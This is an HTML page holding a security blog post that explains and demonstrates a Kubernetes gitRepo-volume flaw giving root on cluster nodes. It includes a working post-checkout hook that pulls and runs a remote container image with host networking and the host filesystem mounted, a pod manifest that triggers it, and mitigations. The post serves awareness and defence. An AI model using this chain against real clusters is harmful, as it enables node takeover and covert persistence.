@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>Fun With GitRepo Volumes</title>
+	
+	<meta name="author" content="raesene">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="https://raesene.github.io/">
+				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
+				Raesene's Ramblings
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
+				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
+				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="https://raesene.github.io/">
+		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
+	</a>
+	<h3 class="title">
+        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>Fun With GitRepo Volumes </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   July 
+	   10th,
+	   
+	   2024
+	 </span>
+	  <div class="article_body">
+	  <p>On Monday this week I noticed a new and really interesting blog from <a href="https://x.com/ImreRad">Imre Rad</a>. The <a href="https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54">Blog Post</a> described an unpatched issue in Kubernetes, which allows any user with the ability to create <code class="language-plaintext highlighter-rouge">gitRepo</code> volumes to execute code on the underlying host as the <code class="language-plaintext highlighter-rouge">root</code> user! For the details of how this works, please read Imre’s blog as all the cool research is his, I’m just looking at how it might be exploited :)</p>
+
+<h2 id="pre-requisites">Pre-requisites</h2>
+
+<p>So the first thing to check is, what do I need to be in place for this issue to be exploited. First up we need the <a href="https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo">gitRepo</a> volume type to be available. This has been deprecated since Kubernetes 1.11, which is a long time ago, but critically it’s not been removed from Kubernetes. In my experiments so far I’ve not found a single distribution that didn’t support it, so that’s good.</p>
+
+<p>Next up, we need the <code class="language-plaintext highlighter-rouge">git</code> binary to be present on the node, as this volume type directly uses the <code class="language-plaintext highlighter-rouge">git</code> binary. From what I’ve seen so far this is a pretty common configuration, with GKE standard, AKS, and RKE all having it present. A default EKS install didn’t but of course I’d guess it could be added if a cluster admin found they needed it. It also wasn’t present in KinD cluster by default, so for my demo I had to add it :D</p>
+
+<p>The last part of the puzzle is user rights. The user who exploits this needs to have <code class="language-plaintext highlighter-rouge">create</code> rights on <code class="language-plaintext highlighter-rouge">pods</code> and also not be blocked from using the <code class="language-plaintext highlighter-rouge">gitRepo</code> volume type. That volume type is not blocked in <a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/">baseline PSS</a> (at the moment), but isn’t allowed in the restricted profile, so it’s possible this wouldn’t work, but I’d guess quite a few clusters don’t block it.</p>
+
+<h2 id="exploiting-the-vulnerability">Exploiting the vulnerability</h2>
+
+<p>So now we know what we need, what can we do with this? Well I was wondering if I could do something based on my earlier research on <a href="https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/">Using Tailscale for persistence</a>, and create a pod that automatically joins a Tailnet as a bot.</p>
+
+<p>To do this we’ll need a Docker image that, when run, starts Tailscale and joins the network. That could be kind of risky as we’ll need to embed an Auth key, but fortunately Tailscale provides <a href="https://tailscale.com/kb/1085/auth-keys#types-of-auth-keys">one-off</a> auth keys that will only function a single time. Also we can use Tailscale ACLs to ensure that when a victim joins, they can’t actually reach anything else on the tailnet.</p>
+
+<p>Next we’ll need to modify Imre’s <a href="https://github.com/irsl/g">PoC</a>. This turns out to be a lot more simple than I thought. Basically you just put any commands you want in the <a href="https://github.com/raesene/repopodexploit/blob/main/hooks/post-checkout">post-checkout</a> script.</p>
+
+<p>In my example I create a Containerd namespace, then pull my Tailscale joining image, and then run it with host networking, and mounting the host’s root filesystem into the container, which looks a bit like this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/sh
+ctr namespace create sys_net_mon
+ctr -n sys_net_mon images pull docker.io/raesene/gitrepodemo:latest
+ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/gitrepodemo:latest sys_net_mon
+</code></pre></div></div>
+
+<p>Then we just need a manifest that has a <code class="language-plaintext highlighter-rouge">gitRepo</code> volume which references the repository with our script. For that we just modify Imre’s PoC with our forked repository.</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">apiVersion</span><span class="pi">:</span> <span class="s">v1</span>
+<span class="na">kind</span><span class="pi">:</span> <span class="s">Pod</span>
+<span class="na">metadata</span><span class="pi">:</span>
+  <span class="na">name</span><span class="pi">:</span> <span class="s">test-pd</span>
+<span class="na">spec</span><span class="pi">:</span>
+  <span class="na">containers</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">image</span><span class="pi">:</span> <span class="s">alpine:latest</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">[</span><span class="s2">"</span><span class="s">sleep"</span><span class="pi">,</span><span class="s2">"</span><span class="s">86400"</span><span class="pi">]</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">test-container</span>
+    <span class="na">volumeMounts</span><span class="pi">:</span>
+    <span class="pi">-</span> <span class="na">mountPath</span><span class="pi">:</span> <span class="s">/gitrepo</span>
+      <span class="na">name</span><span class="pi">:</span> <span class="s">gitvolume</span>
+  <span class="na">volumes</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">gitvolume</span>
+    <span class="na">gitRepo</span><span class="pi">:</span>
+      <span class="na">directory</span><span class="pi">:</span> <span class="s">g/.git</span>
+      <span class="na">repository</span><span class="pi">:</span> <span class="s">https://github.com/raesene/repopodexploit.git</span>
+      <span class="na">revision</span><span class="pi">:</span> <span class="s">main</span>
+</code></pre></div></div>
+
+<h2 id="pulling-it-all-together">Pulling it all together</h2>
+
+<p>So what does this all look like when you run it. Well like most console exploits, not that fancy, but it does demonstrate how someone can go from having <code class="language-plaintext highlighter-rouge">create</code> pod rights to <code class="language-plaintext highlighter-rouge">root</code> on a node, in a single command.</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/9IyowCL8Gd0?si=VkE0n8pDHNegZ1_s" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+
+<h2 id="preventing-this">Preventing this!</h2>
+
+<p>So how do you stop this happening to your cluster. There is a <a href="https://github.com/kubernetes/kubernetes/pull/124531">PR</a> that Imre wrote to fix this. At the moment that’s looking like it will be added to all supported versions of Kubernetes (back to 1.28).</p>
+
+<p>Until that patched version is in place, you can use admission control to block the <code class="language-plaintext highlighter-rouge">gitRepo</code> Volume types. If you have access to ValidatingAdmissionPolicy, then there’s a CEL expression in the <a href="https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo">volume description</a>. Alternatively it should be possible to block this with other common admission control solutions.</p>
+
+<p>A hack fix would be to remove the <code class="language-plaintext highlighter-rouge">git</code> binary from your nodes, but that’s not really a great solution…</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="https://raesene.github.io/categories/index.html#Kubernetes-ref">
+					Kubernetes <span>(58)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/share?text=Fun With GitRepo Volumes&via=raesene"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036" class="img-rounded author-image" />
+        <h4 class="section-title author-name">raesene</h4>
+        <p class="author-bio">Security Geek, Kubernetes, Docker, Ruby, Hillwalking</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://raesene.github.io/blog/2024/06/18/Taking-A-Look-At-Kubernetes-Profiling/" title="Taking a look at Kubernetes Profiling">&larr; Previous</a></li>
+		  
+		  
+			<li class="next disabled"><a>Next &rarr;</a>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2024 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
+</body>
+</html>
+
+
